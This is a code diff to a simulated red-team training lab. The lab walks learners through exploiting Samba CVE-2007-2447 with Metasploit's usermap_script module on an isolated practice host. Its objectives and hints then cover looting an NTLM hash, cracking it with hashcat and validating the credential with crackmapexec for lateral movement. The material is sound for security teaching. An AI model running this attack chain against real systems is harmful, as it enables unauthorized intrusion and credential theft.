@@ -15,21 +15,31 @@ export const redteamToolsLabs: LabScenario[] = [
       'MegaCorp\'s file server (lame-fileshare, 10.10.116.2) is still running the Samba 3.0.20-Debian package with ' +
       '"username map script" enabled — the exact configuration behind CVE-2007-2447, one of the most-used ' +
       'introductory Metasploit modules ever written (exploit/multi/samba/usermap_script), because a malformed ' +
-      'username is passed unsanitized into a shell command by smbd, which runs as root. This lab walks the full ' +
+      'username is passed unsanitized into a shell command by smbd. The version banner identifies an affected-era ' +
+      'candidate but cannot prove the non-default option is enabled; only the isolated lab fixture is known to ' +
+      'contain that configuration. This lab walks the full ' +
       'msfconsole workflow for that module, then treats the resulting root shell the way a real operator would: ' +
       'as a base to loot credential material and pivot deeper into the network with the rest of the standard Kali ' +
       'toolkit — hashcat, CrackMapExec, and secretsdump — rather than stopping at the first foothold.',
     objectives: [
       {
-        text: 'nmap -sV 10.10.116.2',
-        why: 'The banner "Samba smbd 3.0.20-Debian (username map script enabled)" is the exact fingerprint real operators (and Metasploitable2 walkthroughs) look for before ever touching msfconsole — you confirm the vulnerable configuration before spending a single exploit attempt.',
+        text: 'nmap -sV -p 139,445 10.10.116.2',
+        why: 'This identifies the advertised Samba version and exposed SMB ports. Samba 3.0.20 is inside the affected range, but the banner alone cannot prove the non-default username map script option is enabled; treat it as a lead, not confirmation.',
       },
       {
-        text: "In msfconsole: search samba usermap_script; use exploit/multi/samba/usermap_script; set RHOSTS 10.10.116.2; run — modeled here as: exploit samba-usermap-script 10.10.116.2",
-        why: 'This is a real, extremely well-documented Metasploit module: it abuses smbd\'s "username map script" feature to inject shell metacharacters into a username field, which smbd — running as root — passes straight to a shell. No credentials, no chaining, no privilege escalation step required: the very first packet lands you root.',
+        text: 'Start the framework with msfconsole, then search samba usermap_script',
+        why: 'The search finds the maintained module by its vulnerability name. This lab models the commands learners use in Kali instead of accepting a platform-specific exploit shortcut.',
       },
       {
-        text: 'cat root.txt to confirm the root shell, then exit back to your attack box',
+        text: 'Load exploit/multi/samba/usermap_script and inspect it with show options',
+        why: 'The module targets Samba 3.0.20–3.0.25rc3 when the non-default username map script option is enabled. It uses SMB1 and defaults to TCP 139; a version string alone is a clue, not proof of vulnerable configuration.',
+      },
+      {
+        text: 'Set the scoped target with set RHOSTS 10.10.116.2, then run',
+        why: 'The lab host is explicitly in scope. The real module sends a crafted pre-authentication SMB username; it can execute a command with the Samba process identity, which depends on how the service is configured.',
+      },
+      {
+        text: 'Verify the session with whoami and read /root/root.txt',
         why: 'Confirms the exploit actually landed a working root shell rather than just reporting success, and returns you to your own Kali box — hashcat and your wordlists live there, not on the box you just popped.',
       },
       {
@@ -50,9 +60,11 @@ export const redteamToolsLabs: LabScenario[] = [
       },
     ],
     hints: [
-      'nmap -sV 10.10.116.2 — look closely at the Samba version string on port 139/445.',
-      'The real msfconsole sequence is: search samba usermap_script → use exploit/multi/samba/usermap_script → set RHOSTS 10.10.116.2 → run. In this simulated terminal, that entire chain is one command: exploit samba-usermap-script 10.10.116.2',
-      'You are now root on lame-fileshare. cat root.txt for the first flag, then exit to return to your Kali attack box.',
+      'nmap -sV -p 139,445 10.10.116.2 — inspect the Samba version and exposed SMB ports.',
+      'Run msfconsole, then search samba usermap_script.',
+      'Load exploit/multi/samba/usermap_script and run show options. RPORT defaults to 139.',
+      'Set RHOSTS to 10.10.116.2, then run. This is a deliberately vulnerable, isolated training host.',
+      'Verify the session with whoami and read /root/root.txt for the first proof.',
       'Back on your attack box: cat dc-admin.hash to see the looted NTLM hash and which host it belongs to.',
       'hashcat -m 1000 dc-admin.hash wordlists/mini-rockyou.txt — mode 1000 is NTLM, and the password is a common dictionary word.',
       'crackmapexec smb 10.10.116.3 -u Administrator -p dragon — validate the cracked password before using it for anything noisier.',
@@ -74,11 +86,15 @@ export const redteamToolsLabs: LabScenario[] = [
         hostname: 'lame-fileshare',
         ip: '10.10.116.2',
         os: 'Ubuntu 8.04 (Metasploitable2-style legacy file server)',
-        exploitableAs: 'samba-usermap-script',
+        metasploitModule: {
+          path: 'exploit/multi/samba/usermap_script',
+          requiredOptions: [],
+          defaultOptions: { RPORT: '139' },
+        },
         services: [
           { port: 21, name: 'ftp', version: 'vsftpd 2.3.4' },
-          { port: 139, name: 'netbios-ssn', version: 'Samba smbd 3.0.20-Debian (username map script enabled)' },
-          { port: 445, name: 'microsoft-ds', version: 'Samba smbd 3.0.20-Debian (username map script enabled)' },
+          { port: 139, name: 'netbios-ssn', version: 'Samba smbd 3.0.20-Debian' },
+          { port: 445, name: 'microsoft-ds', version: 'Samba smbd 3.0.20-Debian' },
         ],
         users: [],
         root: dir({
